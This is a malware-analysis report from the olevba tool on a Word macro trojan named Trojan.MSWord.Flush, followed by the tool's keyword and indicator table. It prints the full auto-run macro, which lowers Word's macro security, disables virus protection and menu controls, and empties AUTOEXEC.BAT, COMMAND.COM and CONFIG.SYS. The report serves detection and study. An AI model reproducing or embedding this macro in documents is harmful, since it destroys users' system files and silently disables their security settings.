olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Flush
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Flush - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\security", "Level") <> "" Then

    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "level") = 1&

Else

    CommandBars("Tools").Controls("MAcro").Enabled = False

    With Options

        .ConfirmConversions = False
        
        .SaveNormalPrompt = False

        .VirusProtection = False

    End With

End If



SetAttr "C:\Autoexec.BAT", vbNormal         'Let's Flush Autoexec.bat

    Open "C:\AUTOEXEC.BAT" For Output As #1

Close #1



SetAttr "C:\COMMAND.COM", vbNormal          ' Let's Flush Command.com

    Open "C:\COMMAND.COM" For Output As #1

Close #1

SetAttr "C:\CONFIG.SYS", vbNormal

    Open "C:\CONFIG.SYS" For Output As #1   'Let's Flush Config.sys

Close #1



End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autoexec.BAT        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

